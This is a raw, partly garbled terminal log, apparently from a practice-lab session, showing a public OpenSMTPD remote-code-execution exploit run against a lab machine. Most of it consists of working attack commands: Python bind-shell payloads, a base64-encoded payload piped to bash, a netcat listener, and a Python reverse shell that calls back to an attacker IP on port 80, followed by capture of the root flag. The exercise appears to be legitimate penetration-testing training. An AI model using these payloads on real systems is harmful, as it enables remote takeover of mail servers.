+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:12:54][39m $ [K[?1h=[?2004hnc -nv $BoxIP 5557[K[A[39C[32mn[32mc[39m[1B[41D[?1l>[?2004l
+
+id
+nc: connect to 192.168.183.71 port 5557 (tcp) failed: Connection timed out
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:16:41][39m $ [K[?1h=[?2004h[?1l>[?2004l
+[1m[7m%[
+$ [10:16:41] id
+m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33ms[33mu[33mb[33mp[33mr[33mo[33mc[33me[33ms[33ms[33m.[33mc[33ma[33ml[33ml[33m([33m[[36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m,[36m\[36m"[39m[33m-[33mi[36m\[36m"[39m[33m][33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:10:34][39m $ [K[?1h=[?2004hpython3 exploits/47984.py 192.168.183.71 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",5557));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"[K[A[A[35D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[19C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33ms[33me[33mt[33ms[33mo[33mc[33mk[33mo[33mp[33mt[33m([33ms[33mo[33mc[33mk[33me[33mt[33m.[33mS[33mO[33mL[33m_[33mS[33mO[33mC[33mK[33mE[33mT[33m,[33ms[33mo[33mc[33mk[33me[33mt[33m.[33mS[33mO[33m_[33mR[33mE[33mU[33mS[33mE[33mA[33mD[33mD[33mR[33m,[33m1[33m)[33m;[33ms[33m.[33mb[33mi[33mn[33md[33m([33m([36m\[36m"[39m[33m0[33m.[33m0[33m.[33m0[33m.[33m0[36m\[36m"[39m[33m,[33m5[33m5[33m5[33m7[33m)[33m)[33m;[33ms[33m.[33ml[33mi[33ms[33mt[33me[33mn[33m([33m1[33m)[33m;[33mc[33m,[33ma[33m=[33ms[33m.[33ma[33mc[33mc[33me[33mp[33mt[33m([33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:14:20][39m $ [K[?1h=[?2004hBIND=$(echo "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",5560));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'" | base64 -w0)[K
+echo $BIND[K[3A[46C[35m$[35m([39m[32me[32mc[32mh[32mo[39m [33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33ms[33me[33mt[33ms[33mo[33mc[33mk[33mo[33mp[33mt[33m([33ms[33mo[33mc[33mk[33me[33mt[33m.[33mS[33mO[33mL[33m_[33mS[33mO[33mC[33mK[33mE[33mT[33m,[33ms[33mo[33mc[33mk[33me[33mt[33m.[33mS[33mO[33m_[33mR[33mE[33mU[33mS[33mE[33mA[33mD[33mD[33mR[33m,[33m1[33m)[33m;[33ms[33m.[33mb[33mi[33mn[33md[33m([33m([36m\[36m"[39m[33m0[33m.[33m0[33m.[33m0[33m.[33m0[36m\[36m"[39m[33m,[33m5[33m5[33m6[33m0[33m)[33m)[33m;[33ms[33m.[33ml[33mi[33ms[33mt[33me[33mn[33m([33m1[33m)[33m;[33mc[33m
+$ [10:17:29] BIND=$(echo "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",5560));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'" | base64 -w0)
+echo $BIND
+
+$ [10:17:57] python3 exploits/47984.py $BoxIP 25 "echo $BIND|base64 -d|bash"
+
+$ [10:17:59] rlwrap nc $BoxIP 5560
+
+$ [10:18:49] BIND_CLEAN=$(echo $BIND | tr -d '=')
+python3 exploits/47984.py $BoxIP 25 "echo $BIND_CLEAN|base64 -d|bash"
+
+$ [10:24:58] sudo nc -lvnp 80
+,[33ma[33m=[33ms[33m.[33ma[33mc[33mc[33me[33mp[33mt[33m([33m)[33m;[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33m0[33m)[33m;[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33m1[33m)[33m;[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33m2[33m)[33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[3C[32mb[32ma[32ms[32me[32m6[32m4[39m[4C[35m)[39m[1B[32me[32mc[32mh[32mo[39m[6C[?1l>[?2004l
+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5zZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULHNvY2tldC5TT19SRVVTRUFERFIsMSk7cy5iaW5kKCgiMC4wLjAuMCIsNTU2MCkpO3MubGlzdGVuKDEpO2MsYT1zLmFjY2VwdCgpO29zLmR1cDIoYy5maWxlbm8oKSwwKTtvcy5kdXAyKGMuZmlsZW5vKCksMSk7b3MuZHVwMihjLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg==
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:17:29][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "echo $BIND|base64 -d|bash"[63D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33me[33mc[33mh[33mo[33m [36m$[36mB[36mI[36mN[36mD[39m[33m|[33mb[33ma[33ms[33me[33m6[33m4[33m [33m-[33md[33m|[33mb[33ma[33ms[33mh[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[!] Error sending payload, expected 250
+[!] Received: b'553 5.1.0 Sender address syntax error\r\n'
+[!] Exiting...
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:17:57][39m $ [K[?1h=[?2004hBIND_CLEAN=$(echo $BIND | tr -d '=')
+python3 exploits/47984.py $BoxIP 25 "echo $BIND_CLEAN|base64 -d|bash"[K[A[35m$[35m([39m[32me[32mc[32mh[32mo[39m[9C[32mt[32mr[39m[4C[33m'[33m=[33m'[39m[35m)[39m[1B[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33me[33mc[33mh[33mo[33m [36m$[36mB[36mI[36mN[36mD[36m_[36mC[36mL[36mE[36mA[36mN[39m[33m|[33mb[33ma[33ms[33me[33m6[33m4[33m [33m-[33md[33m|[33mb[33ma[33ms[33mh[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[!] Error sending payload, expected 250
+[!] Received: b'553 5.1.0 Sender address syntax error\r\n'
+[!] Exiting...
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:18:49][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 'python -c "import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.194\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'[K[A[A[18D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m'[33mp[33my[33mt[33mh[33mo[33mn[33m [33m-[33mc[33m [33m"[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33ms[33mo[33mc[33mk[33me[33mt[33m.[33mA[33mF[33m_[33mI[33mN[33mE[33mT[33m,[33ms[33mo[33mc[33mk[33me[33mt[33m.[33mS[33mO[33mC[33mK[33m_[33mS[33mT[33mR[33mE[33mA[3
+$ [10:25:08] python3 exploits/47984.py $BoxIP 25 'python -c "import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.194\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
+
+$ [10:29:26] loot flag root b44a2bfcadb23b50cc9a121eab3d5f6c
+
+$ [10:32:39] boxdone
